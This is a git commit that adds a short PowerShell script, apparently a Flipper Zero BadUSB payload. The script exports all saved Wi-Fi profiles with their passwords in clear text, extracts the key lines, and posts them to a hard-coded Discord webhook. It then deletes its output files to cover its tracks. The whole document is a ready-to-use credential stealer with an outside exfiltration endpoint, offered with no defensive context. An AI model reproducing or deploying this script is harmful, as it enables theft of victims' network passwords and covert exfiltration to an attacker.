5cc25fa76907474ef7ffd4beb1c51561939a4356
Flooo-Github <161171203+Flooo-Github@users.noreply.github.com>
2024-06-05 22:58:19 +0200

    Add files via upload

---
+++ Wifi_for_flipper.ps1
@@ -0,0 +1,13 @@
+cd $env:TEMP
+netsh wlan export profile key=clear
+dir Wi*.xml
+Select-String -Path Wi*.xml -Pattern 'keyMaterial' | Out-File -FilePath "Wi-Fi-PASS.txt"
+dir Wi-Fi-PASS.txt
+$fileContent = Get-Content "Wi-Fi-PASS.txt" -Raw
+if ($fileContent) {
+    Invoke-WebRequest -Uri 'https://discord.com/api/webhooks/1247670860190584884/G7SdYHwgibfF6KCvNWg1-3ldcmI3WgGIMeOraABtjTK8SCmMBNu_1S09sLQi2nwmuzGD' -Method POST -Body @{content=$fileContent}
+} else {
+    echo 'No data to send'
+}
+del Wi-* /s /f /q
+exit
